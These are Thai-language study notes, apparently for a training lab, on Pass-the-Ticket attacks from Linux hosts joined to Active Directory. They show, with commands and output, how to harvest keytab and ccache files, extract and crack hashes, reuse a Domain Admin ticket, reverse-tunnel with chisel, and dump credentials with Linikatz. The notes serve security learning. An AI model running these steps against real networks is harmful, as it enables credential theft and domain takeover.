# Pass the Ticket (PtT) จาก Linux

## บทนำ

แม้ว่าจะไม่ใช่เรื่องปกติ แต่คอมพิวเตอร์ Linux สามารถเชื่อมต่อกับ Active Directory เพื่อจัดการตัวตนแบบรวมศูนย์และบูรณาการกับระบบขององค์กร ทำให้ผู้ใช้สามารถใช้ identity เดียวกันในการยืนยันตัวตนทั้งบน Linux และ Windows

เมื่อ Linux เชื่อมต่อกับ AD จะใช้ **Kerberos** เป็นวิธียืนยันตัวตน หากเราสามารถโจมตี Linux machine ที่เชื่อมต่อกับ AD ได้สำเร็จ เราสามารถหา Kerberos tickets เพื่อปลอมตัวเป็นผู้ใช้อื่นและขยายการเข้าถึงในเครือข่าย

**Note**:เครื่อง Linux ที่ไม่ได้เชื่อมต่อกับ Active Directory สามารถใช้ตั๋ว Kerberos ในสคริปต์หรือเพื่อยืนยันตัวตนกับเครือข่ายได้ ไม่จำเป็นต้องเข้าร่วมโดเมนเพื่อใช้ตั๋ว Kerberos จากเครื่อง Linux

## Kerberos บน Linux

### การจัดเก็บ Kerberos Tickets

Windows และ Linux ใช้กระบวนการเดียวกันในการขอ TGT และ Service Ticket แต่วิธีการจัดเก็บแตกต่างกัน:

**ตำแหน่งเก็บ Tickets:**
- ส่วนใหญ่เก็บเป็น **ccache files** ใน `/tmp`
- Environment variable `KRB5CCNAME` จะเก็บตำแหน่งของ ticket
- ไฟล์มีการป้องกันด้วย permissions แต่ root สามารถเข้าถึงได้

**Keytab Files:**
- เก็บคู่ของ Kerberos principals และ encrypted keys
- ใช้สำหรับยืนยันตัวตนอัตโนมัติโดยไม่ต้องป้อนรหัสผ่าน
- มักใช้ใน scripts เพื่อเข้าถึงทรัพยากรโดยอัตโนมัติ
- สามารถสร้างบนเครื่องหนึ่งและคัดลกไปใช้บนเครื่องอื่นได้

## Scenario การโจมตี

### การเข้าถึงเครื่อง Linux

**เชื่อมต่อผ่าน SSH:**
```bash
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

### 1. ตรวจสอบว่า Linux เชื่อมต่อกับ AD หรือไม่
เหตุผลที่ต้อง Check
1. **เพื่อระบุ Attack Surface ที่แตกต่างกัน**

```
Linux Machine สองประเภท:

┌─────────────────────────────────────────────────────────────┐
│ Type 1: Domain-Joined Linux                                │
│ ✓ มี sssd/winbind daemon                                    │
│ ✓ มี /etc/krb5.keytab (computer account)                   │
│ ✓ มี domain user credentials cached                        │
│ ✓ มี automatic ticket renewal                              │
│ → Attack: Dump machine account, steal cached creds         │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ Type 2: Non-Domain Linux (แต่ใช้ Kerberos)                  │
│ ✓ มี keytab files สำหรับ scripts เท่านั้น                  │
│ ✓ ไม่มี /etc/krb5.keytab                                    │
│ ✓ ไม่มี cached domain credentials                          │
│ ✓ ต้อง kinit manually หรือผ่าน script                      │
│ → Attack: หา keytab ใน scripts/cron เท่านั้น              │
└─────────────────────────────────────────────────────────────┘
```

2. **ความแตกต่างในการโจมตี**

| ลักษณะ | Domain-Joined | Non-Domain (แต่ใช้ Kerberos) |
|--------|---------------|------------------------------|
| **Machine Account** | ✅ มี (LINUX01$) | ❌ ไม่มี |
| **Auto Ticket Refresh** | ✅ มี | ❌ ไม่มี |
| **Cached Credentials** | ✅ มี (sssd cache) | ❌ ไม่มี |
| **Computer Keytab** | ✅ /etc/krb5.keytab | ❌ ไม่มี |
| **User Keytabs** | ✅ อาจมี | ✅ อาจมี |
| **ccache files** | ✅ มีจาก login sessions | ⚠️ มีแค่เมื่อ script รัน |

---

### วิธีตรวจสอบว่า Linux เชื่อมต่อกับ AD หรือไม่

**ใช้ realm command:**
```bash
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

**ผลลัพธ์:**
- `type: kerberos` - ยืนยันว่าใช้ Kerberos
- `realm-name: INLANEFREIGHT.HTB` - ชื่อ domain
- `configured: kerberos-member` - เป็น member ของ domain
- `permitted-logins` - รายชื่อผู้ใช้ที่สามารถ login ได้

**ตรวจสอบด้วย process:**
```bash
ps -ef | grep -i "winbind\|sssd"
```
**ผลลัพธ์**
```
root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```
หา services เช่น `sssd` หรือ `winbind` ที่รันอยู่



## 2.1 หา KeyTab Files

**ค้นหาไฟล์ที่มีชื่อ keytab:**
```bash
find / -name *keytab* -ls 2>/dev/null
```
**Note**: To use a keytab file, we must have read and write (rw) privileges on the file.? แค่ read น่าจะพอ

**ตัวอย่างผลลัพธ์:**
- `/etc/krb5.keytab` - Computer account ticket (อ่านได้โดย root เท่านั้น)
- `/opt/specialfiles/carlos.keytab` - User keytab

**ค้นหาใน cronjobs:**
```bash
arlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
...SNIP...
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

```
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```
**ผลลัพธ์:**
- ใช้ keytab เพื่อรับ TGT
- kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

**Note**:
เครื่องที่เข้าร่วมโดเมน Linux จำเป็นต้องมีตั๋ว ตั๋วจะแสดงเป็นไฟล์ keytab ซึ่งโดยค่าเริ่มต้นอยู่ที่ /etc/krb5.keytab และมีเพียงผู้ใช้ root เท่านั้นที่สามารถอ่านได้ หากเราเข้าถึงตั๋วนี้ได้ เราจะสามารถปลอมตัวเป็นบัญชีคอมพิวเตอร์ LINUX01$.INLANEFREIGHT.HTB ได้

## 2.2 หา ccache Files

**ตรวจสอบ environment variable:**
```bash
env | grep -i krb5
```

**ผลลัพธ์:**
```
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

**ค้นหาไฟล์ใน /tmp:**
```bash
ls -la /tmp
```

**ตัวอย่างไฟล์ที่พบ:**
```
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 krb5cc_647401106_tBswau
-rw------- 1 david@inlanefreight.htb domain users@inlanefreight.htb 1406 krb5cc_647401107_Gf415d
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 krb5cc_647402606_qd2Pfh
```

## 3. การใช้งาน KeyTab Files

### 3.1 ตรวจสอบข้อมูลใน KeyTab

```bash
klist -k -t /opt/specialfiles/carlos.keytab
```

**ผลลัพธ์:**
```
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

### 3.2 Impersonate ผู้ใช้ด้วย kinit

```bash
# ตรวจสอบ ticket ปัจจุบัน
klist

# Import ticket ของ Carlos
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# ยืนยันการเปลี่ยน
klist
```
**Note**: kinit คำนึงถึงตัวพิมพ์เล็ก-ใหญ่ ดังนั้นโปรดใช้ชื่อของผู้รับผิดชอบตามที่แสดงใน klist ในกรณีนี้ ชื่อผู้ใช้จะเป็นตัวพิมพ์เล็ก และชื่อโดเมนจะเป็นตัวพิมพ์ใหญ่
### 3.3 ทดสอบการเข้าถึง SMB Share

```bash
smbclient //dc01/carlos -k -c ls
```

**หมายเหตุ:** ถ้าต้องการเก็บ ticket เดิม ให้ทำสำเนา ccache file ก่อนใช้ keytab ใหม่

#### พฤติกรรมของ kinit กับ Credential Cache

**การ Overwrite เดิม:**
```bash
# User1 ทำ kinit ก่อน
kinit user1@DOMAIN.COM
# สร้าง /tmp/krb5cc_1000 สำหรับ user1

# User2 ทำ kinit ทับ
kinit -kt user2.keytab user2@DOMAIN.COM
# OVERWRITE /tmp/krb5cc_1000
# ตอนนี้มีแต่ ticket ของ user2 เท่านั้น!
```

## 4. การ Extract Hashes จาก KeyTab

### 4.1 ใช้ KeyTabExtract

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

**ผลลัพธ์:**
```
REALM : INLANEFREIGHT.HTB
SERVICE PRINCIPAL : carlos/
NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

### 4.2 Crack Password Hash

**วิธีการ:**
- ใช้ Hashcat หรือ John the Ripper
- ใช้เว็บไซต์ออนไลน์เช่น https://crackstation.net/

**ตัวอย่าง:**
- NTLM Hash: `a738f92b3c08b424ec2d99589a9cce60`
- Password: `Password5`

### 4.3 Login เป็นผู้ใช้

```bash
su - carlos@inlanefreight.htb
# ป้อนรหัสผ่าน: Password5

klist  # ตรวจสอบ ticket ใหม่
```

## 5. การใช้งาน ccache Files

หากต้องการใช้ไฟล์ ccache ในทางที่ผิด เราเพียงแค่ต้องมีสิทธิ์อ่านไฟล์นั้น ไฟล์เหล่านี้อยู่ใน /tmp และสามารถอ่านได้โดยผู้ใช้ที่สร้างไฟล์นั้นเท่านั้น แต่หากเราได้รับสิทธิ์ root เราก็สามารถใช้ไฟล์เหล่านี้ได้

### 5.1 Privilege Escalation

**ตรวจสอบสิทธิ์ sudo:**
```bash
sudo -l
```

**Escalate เป็น root:**
```bash
sudo su
whoami  # ควรแสดง root
```

### 5.2 ค้นหา ccache files ของผู้ใช้อื่น

```bash
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

**ตัวอย่าง:** พบ ticket ของ julio@inlanefreight.htb

**ตรวจสอบ group membership:**
```bash
id julio@inlanefreight.htb
```

**ผลลัพธ์:**
```
groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb)
```

Julio เป็นสมาชิกของ **Domain Admins**!

### 5.3 Import ccache File

```bash
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022

                7706623 blocks of size 4096. 4447612 blocks available
```

**หมายเหตุสำคัญ:** ตรวจสอบ "Valid starting" และ "Expires" - ticket ที่หมดอายุจะใช้ไม่ได้

## 6. การใช้ Attack Tools บน Linux กับ Kerberos

### 6.1 การเตรียมสภาพแวดล้อม

**แก้ไข /etc/hosts:**
```bash
172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
```

**ตั้งค่า Proxychains:**
```bash
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

### 6.2 ตั้งค่า Chisel สำหรับ Tunneling

**บน Attack Host:**
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```

**บน MS01 (Windows):client IP is your attack host IP**
```cmd
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

### 6.3 ใช้ Impacket กับ Kerberos

**ตั้งค่า environment variable:**
```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

**ใช้ impacket-wmiexec:**
```bash
proxychains impacket-wmiexec dc01 -k
```
- หากเราได้รับแจ้งให้ใส่รหัสผ่าน เราก็สามารถรวมตัวเลือก -no-pass ได้ด้วย

**ตัวอย่างผลลัพธ์:**
```
C:\>whoami
inlanefreight\julio
```
## ปัญหา FILE: Prefix

### ❌ **รูปแบบที่ทำให้ Impacket งง**
```bash
# บางระบบ Linux ที่ join domain จะตั้งแบบนี้
echo $KRB5CCNAME
FILE:/tmp/krb5cc_1000

# หรือ
FILE:/tmp/krb5cc_1000_XXXXXX
```

### ✅ **รูปแบบที่ Impacket ต้องการ**
```bash
# Impacket ต้องการ path ธรรมดา (ไม่มี prefix)
echo $KRB5CCNAME
/tmp/krb5cc_1000
```

## ทำไมถึงเกิดปัญหา?

### **Linux AD Integration Tools**

```bash
# เครื่องที่ join domain ด้วย:
# - realmd
# - sssd
# - adcli

# มักจะตั้ง KRB5CCNAME แบบนี้:
FILE:/tmp/krb5cc_1000      # SSSD format
DIR:/run/user/1000/krb5cc  # Collection format
KEYRING:persistent:1000    # Kernel keyring
```

### 6.4 ใช้ Evil-WinRM กับ Kerberos

**ติดตั้ง krb5-user:**
```bash
sudo apt-get install krb5-user -y
```

**Configuration:**
- Default Kerberos realm: `INLANEFREIGHT.HTB`
- KDC: `DC01`

**แก้ไข /etc/krb5.conf:**
```
[libdefaults]
    default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

**เชื่อมต่อ:**
```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## 7. เครื่องมือเสริม

### 7.1 Impacket Ticket Converter

**แปลง ccache เป็น kirbi:**
```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

**ใช้ kirbi file ใน Windows:**
```cmd
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
klist
dir \\dc01\julio
```
- We can do the reverse operation by first selecting a .kirbi file

### 7.2 Linikatz

**วัตถุประสงค์:** Extract credentials จาก Linux ที่เชื่อมต่อกับ AD (เหมือน Mimikatz บน Windows)

**ข้อกำหนด:** ต้องมีสิทธิ์ root

**ดาวน์โหลดและใช้งาน:**
```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
./linikatz.sh
```

**สิ่งที่ Extract ได้:**
- Kerberos tickets ทุกประเภท
- Credentials จาก FreeIPA, SSSD, Samba, Vintella
- ccache และ keytab files
- Cached hashes
- Machine Kerberos tickets

**ผลลัพธ์:** สร้างโฟลเดอร์ที่ขึ้นต้นด้วย `linikatz.` พร้อม credentials ในรูปแบบต่างๆ





cache file
https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
keytab
https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
realm
https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd
kinit
https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html
KeyTabExtract
https://github.com/sosdave/KeyTabExtract
chisel
https://github.com/jpillora/chisel
proxychains
https://github.com/haad/proxychains
impacket-ticketConverter
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py
Linikatz
https://github.com/CiscoCXSecurity/linikatz


### เพิ่มเติม

## การทำงานของ kinit

**kinit** เป็นเครื่องมือหลักในการทำงานกับ Kerberos authentication โดยมีหน้าที่สำคัญดังนี้:

### 1. **การร้องขอ TGT (Ticket Granting Ticket)**
```bash
kinit username@DOMAIN.COM
# ระบบจะขอรหัสผ่านและส่ง AS-REQ ไปยัง KDC
# เมื่อสำเร็จจะได้ TGT กลับมา
```

### 2. **การเก็บ Ticket ใน Cache**
- Tickets จะถูกเก็บไว้ในไฟล์ **ccache** (Credential Cache)
- ตำแหน่งเริ่มต้น: `/tmp/krb5cc_[UID]`
- สามารถดูด้วย: `klist` หรือ `echo $KRB5CCNAME`

## Keytab และ Kerberos Authentication Process

### บทบาทของ Keytab ใน Authentication

```
Client                          KDC (Key Distribution Center)
  |                                    |
  |  1. AS-REQ (Authentication Request)|
  |    - Username                       |
  |    - Encrypted Timestamp ---------> |
  |      (ใช้ key จาก keytab)          |
  |                                    |
  |  2. KDC ตรวจสอบ:                   |
  |     - Decrypt timestamp             |
  |     - ตรวจสอบว่า timestamp ถูกต้อง |
  |     - ไม่เก่าเกินไป (time skew)    |
  |                                    |
  | <--------- 3. AS-REP (TGT)         |
  |    - TGT encrypted with krbtgt key |
  |    - Session key                   |
```

### รายละเอียดการ Encrypt Timestamp

**Pre-authentication** ใน Kerberos ใช้ timestamp เพื่อป้องกัน replay attacks:

```bash
# เมื่อใช้ kinit กับ keytab
kinit -kt user.keytab username@DOMAIN.COM

# สิ่งที่เกิดขึ้นภายใน:
# 1. อ่าน encryption key จาก keytab
# 2. สร้าง timestamp ปัจจุบัน
# 3. Encrypt timestamp ด้วย key ที่ได้จาก keytab
# 4. ส่ง AS-REQ พร้อม encrypted timestamp ไปยัง KDC
```

### โครงสร้างของ Keytab

```bash
# ดูข้อมูลใน keytab
klist -ket user.keytab

# Output:
Keytab name: FILE:user.keytab
KVNO Timestamp           Principal
---- ------------------- --------------------------------------------------
   3 10/06/2022 17:09:13 sqlsvc@INLANEFREIGHT.HTB (aes256-cts-hmac-sha1-96)
   3 10/06/2022 17:09:13 sqlsvc@INLANEFREIGHT.HTB (aes128-cts-hmac-sha1-96)
   3 10/06/2022 17:09:13 sqlsvc@INLANEFREIGHT.HTB (arcfour-hmac)
```

**ประกอบด้วย:**
- **Principal name** - ชื่อ user/service
- **KVNO** (Key Version Number) - version ของ key
- **Encryption type** - algorithm ที่ใช้
- **Key material** - ตัว key เอง (derived จาก password)
